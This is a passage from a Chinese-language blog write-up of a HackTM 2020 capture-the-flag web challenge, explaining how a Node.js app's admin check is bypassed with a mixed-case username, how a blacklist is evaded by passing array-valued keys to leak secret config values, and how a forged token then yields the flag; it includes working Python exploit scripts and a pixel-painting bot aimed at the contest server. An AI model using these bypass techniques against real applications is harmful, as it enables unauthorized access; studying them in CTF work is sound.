<li>4、更改<code>{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}</code>-&gt;<code>&quot;alg&quot;: &quot;none&quot;</code></li>
<li>5、提交服务器<br>但是该方法也不行。</li>
</ul>
<p>总之，关键点就在于：</p>
<ul>
<li>1、使<code>req.user.id==0</code></li>
<li>2、为了实现1需要得到<code>config.n</code></li>
<li>3、可能有其他方式得到<code>config.n</code>或者<code>config.p</code></li>
</ul>
<p>从下面一段代码可以得到新的思路：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">app.get("/serverInfo", (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Get server info</span></span><br><span class="line">  <span class="comment">// Only for logged in users</span></span><br><span class="line"></span><br><span class="line">  let user = users[req.user.id] || &#123; rights: [] &#125;;</span><br><span class="line">  let info = user.rights.map(i =&gt; (&#123; name: i, value: config[i] &#125;));</span><br><span class="line">  res.json(ok(&#123; info: info &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>应该是利用<code>user.rights</code>作为访问key直接读取对象的代码，如果可以插入自己的<code>user.rights</code>，便可以插入<code>n</code>从而得到<code>config.n</code>的值。<br>然后发现另一段更新用户数据的代码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">app.post("/updateUser", (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Update user color and rights</span></span><br><span class="line">  <span class="comment">// Only for admin</span></span><br><span class="line">  <span class="comment">// POST</span></span><br><span class="line">  <span class="comment">// &#123;</span></span><br><span class="line">  <span class="comment">//   color: 0xDEDBEE,</span></span><br><span class="line">  <span class="comment">//   rights: ["height", "width", "usersOnline"]</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  let uid = req.user.id;</span><br><span class="line">  let user = users[uid];</span><br><span class="line">  if (!user || !isAdmin(user)) &#123;</span><br><span class="line">    res.json(err("You're not an admin!"));</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  let color = parseInt(req.body.color);</span><br><span class="line">  users[uid].color = (color || 0x0) &amp; 0xffffff;</span><br><span class="line">  let rights = req.body.rights || [];</span><br><span class="line">  if (rights.length &gt; 0 &amp;&amp; checkRights(rights)) &#123;</span><br><span class="line">    users[uid].rights = user.rights.concat(rights).filter(onlyUnique);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.json(ok(&#123; user: users[uid] &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>但是想要插入<code>rigths</code>必须绕过<code>isAdmin(user)</code>的判断，同时还有<code>isValidUser(user)</code>的判断：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">function isAdmin(u) &#123;</span><br><span class="line">  return u.username.toLowerCase() == config.adminUsername.toLowerCase();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isValidUser(u) &#123;</span><br><span class="line">  return (</span><br><span class="line">    u.username.length &gt;= 3 &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以利用下面的方式仿造<code>admin</code>：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">var admin = "hacktm";</span><br><span class="line">var user = "hacKtm";</span><br></pre></td></tr></table></figure>
<p>结果满足条件：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">"hacKtm".toLowerCase() == "hacktm".toLowerCase() // true</span><br><span class="line">"hacKtm".toUpperCase() === "hacktm".toUpperCase() // false</span><br></pre></td></tr></table></figure>
<p>然后即可插入<code>rigths</code>，插入的时候需要经过<code>checkRights(rights)</code>的判断：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">function checkRights(arr) &#123;</span><br><span class="line">  let blacklist = ["p", "n", "port"];</span><br><span class="line">  for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class="line">    const element = arr[i];</span><br><span class="line">    if (blacklist.includes(element)) &#123;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们看到，黑名单中限制了<code>p</code>和<code>n</code>的上传，可以通过<strong>利用数组作为键</strong>的方式绕过：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">"rights":[["n"]]</span><br></pre></td></tr></table></figure>
<p>从而即可读取到<code>n</code>，然后通过使<code>p==n</code>，<code>q==1</code>，即可使<code>req.user.id==0</code>，从而拿到<code>flag</code>。</p>
<h4 id="Expoit"><a href="#Expoit" class="headerlink" title="Expoit"></a>Expoit</h4><p>参照大佬脚本：<br>获取<code>n</code>，<code>p</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://167.172.165.153:60001"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create user with the admin username</span></span><br><span class="line">resp = requests.post(url + <span class="string">"/login"</span>,</span><br><span class="line">                     json=&#123;<span class="string">"username"</span>: <span class="string">"hacKtm"</span>&#125;)</span><br><span class="line">resp.raise_for_status()</span><br><span class="line">token = resp.json()[<span class="string">'data'</span>][<span class="string">'token'</span>]</span><br><span class="line">print(<span class="string">"[*] Created user with admin username"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add illegal rights</span></span><br><span class="line">resp = requests.post(url + <span class="string">"/updateUser"</span>,</span><br><span class="line">                     json=&#123;<span class="string">"rights"</span>: [[<span class="string">"n"</span>], [<span class="string">"p"</span>]]&#125;,</span><br><span class="line">                     headers=&#123;<span class="string">"Authorization"</span>: <span class="string">"Bearer %s"</span> % token&#125;)</span><br><span class="line">resp.raise_for_status()</span><br><span class="line">print(<span class="string">"[*] updated rights"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fetch secret config values</span></span><br><span class="line">resp = requests.get(url + <span class="string">"/serverInfo"</span>,</span><br><span class="line">                    headers=&#123;<span class="string">"Authorization"</span>: <span class="string">"Bearer %s"</span> % token&#125;)</span><br><span class="line">resp.raise_for_status()</span><br><span class="line">print(<span class="string">"[*] fetched secret config values"</span>)</span><br><span class="line"></span><br><span class="line">server_info = resp.json()</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> server_info[<span class="string">"data"</span>][<span class="string">"info"</span>]:</span><br><span class="line">    <span class="keyword">if</span> isinstance(key[<span class="string">"name"</span>], list):</span><br><span class="line">        print(<span class="string">"[*] %s = %s"</span> % (key[<span class="string">"name"</span>][<span class="number">0</span>], key[<span class="string">"value"</span>]))</span><br></pre></td></tr></table></figure>
<p>获取<code>flag</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt  <span class="comment"># pip install pyjwt</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"p"</span>: <span class="string">"54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979"</span>,</span><br><span class="line">    <span class="string">"q"</span>: <span class="string">"1"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(url+<span class="string">"/init"</span>, json=data)</span><br><span class="line">token = resp.json()[<span class="string">'data'</span>][<span class="string">'token'</span>]</span><br><span class="line">jwt_claim = jwt.decode(token, verify=<span class="literal">False</span>, algorithms=[<span class="string">'HS256'</span>])</span><br><span class="line"><span class="keyword">assert</span> jwt_claim[<span class="string">'id'</span>] == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">resp = requests.get(url+<span class="string">"/flag"</span>, headers=&#123;<span class="string">"Authorization"</span>: <span class="string">"Bearer %s"</span> % token&#125;)</span><br><span class="line">print(resp.json())</span><br></pre></td></tr></table></figure>
<p>关于<code>node.js</code>的考核可以参考Pcat师傅分享的题解：<a href="https://xz.aliyun.com/t/7177" target="_blank" rel="noopener">https://xz.aliyun.com/t/7177</a><br><strong>Bonus！从大佬那拿到了一个画画机器人代码，简单实用！</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  <span class="comment"># pip install pillow-simd requests</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://167.172.165.153:60001"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_color_token</span><span class="params">(_hex)</span>:</span></span><br><span class="line">    resp = requests.post(url+<span class="string">"/login"</span>, json=&#123;<span class="string">"username"</span>: <span class="string">"hacKtm"</span>&#125;)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line">    token = resp.json()[<span class="string">'data'</span>][<span class="string">'token'</span>]</span><br><span class="line">    data = &#123;<span class="string">"color"</span>: int(_hex, <span class="number">16</span>)&#125;</span><br><span class="line"></span><br><span class="line">    resp = requests.post(url+<span class="string">"/updateUser"</span>, json=data, headers=&#123;<span class="string">"Authorization"</span>: <span class="string">"Bearer %s"</span> % token&#125;)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img = Image.open(sys.argv[<span class="number">1</span>])</span><br><span class="line">img = img.convert(<span class="string">"RGBA"</span>)</span><br><span class="line">pix = img.load()</span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">"rm output/*"</span>).read()</span><br><span class="line"></span><br><span class="line">output = &#123;&#125;</span><br><span class="line">numcolors = []</span><br><span class="line">hexlookup = &#123;&#125;</span><br><span class="line">data = &#123;&#125;</span><br><span class="line">hexi = <span class="keyword">lambda</span> k: struct.pack(<span class="string">'B'</span>, k).hex()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, img.width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, img.height):</span><br><span class="line">        r, g, b, a = pix[x, y]</span><br><span class="line">        <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        cc = (r, g, b)</span><br><span class="line">        <span class="keyword">if</span> cc <span class="keyword">not</span> <span class="keyword">in</span> numcolors:</span><br><span class="line">            numcolors.append(cc)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        hexlookup.setdefault(cc, <span class="string">f"<span class="subst">&#123;hexi(r)&#125;</span><span class="subst">&#123;hexi(g)&#125;</span><span class="subst">&#123;hexi(b)&#125;</span>"</span>)</span><br><span class="line">        data.setdefault(hexlookup[cc], [])</span><br><span class="line">        data[hexlookup[cc]].append((x, y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> data.items():</span><br><span class="line">    f = open(<span class="string">"output/%s.txt"</span> % k, <span class="string">"a"</span>)</span><br><span class="line">    <span class="keyword">for</span> coord <span class="keyword">in</span> v:</span><br><span class="line">        x, y = coord</span><br><span class="line">        f.write(<span class="string">"%s\n"</span> % json.dumps(&#123;<span class="string">"x"</span>: x, <span class="string">"y"</span>: y&#125;))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> data.items():</span><br><span class="line">    f = open(<span class="string">"output/%s.sh"</span> % k, <span class="string">"a"</span>)</span><br><span class="line">    f.write(<span class="string">"#!/bin/bash\n\n"</span>)</span><br><span class="line"></span><br><span class="line">    token = get_color_token(k)</span><br><span class="line">    cmd = <span class="string">"""curl -vv -XPOST -m3 -s --data "$1" -H "Content-Type: application/json" -H "Authorization: Bearer %s" %s/paint"""</span> % (</span><br><span class="line">        token, url</span><br><span class="line">    )</span><br><span class="line">    f.write(cmd)</span><br><span class="line">    f.write(<span class="string">"\n"</span>)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"parallel -j +10 ./output/%s.sh &lt; output/%s.txt"</span> % (k, k))</span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">"chmod +x output/*.sh"</span>).read()</span><br></pre></td></tr></table></figure>
<p><strong>用法</strong></p>
<ul>
<li>1、该脚本利用题目提供的<code>JSON</code>像素数据获取一个120*80的PNG图像(比如这个题目就给了包含像素数据的JSON)</li>
<li>2、生成像素数据：<code>python main.py &quot;image.png&quot;</code></li>
<li>3、像素数据在<code>output/</code>中</li>
<li>4、该脚本将输出可以运行的GNU并行命令<br>这个题目确实学到了很多。</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>简单的可以做，难的做不出，但是学到很多，继续努力！ヾ(◍°∇°◍)ﾉﾞ</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">ggb0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://ggb0n.cool/2020/02/04/HackTM2020-WriteUp/">http://ggb0n.cool/2020/02/04/HackTM2020-WriteUp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">条件竞争</a><a class="post-meta__tags" href="/tags/JWT%E4%BC%AA%E9%80%A0/">JWT伪造</a><a class="post-meta__tags" href="/tags/crypto/">crypto</a><a class="post-meta__tags" href="/tags/RSA%E6%94%BB%E5%87%BB/">RSA攻击</a><a class="post-meta__tags" href="/tags/RSA%E9%A2%91%E7%8E%87%E8%A1%A8%E6%94%BB%E5%87%BB/">RSA频率表攻击</a><a class="post-meta__tags" href="/tags/RSA%E9%80%90%E5%AD%97%E8%8A%82%E7%88%86%E7%A0%B4/">RSA逐字节爆破</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/"><i class="fa fa-chevron-left">  </i><span>BUUCTF-web刷题Ⅰ</span></a></div><div class="next-post pull-right"><a href="/2020/02/03/MaliciousCode-FileInfect/"><span>MaliciousCode-FileInfect</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2020 by ggb0n</div><div class="footer_custom_text">一生一世，爱你一人。</div><div class="icp"><a href="http://www.beian.miit.gov.cn/" target="_blank" rel="noopener"><span>豫ICP备20003023号</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>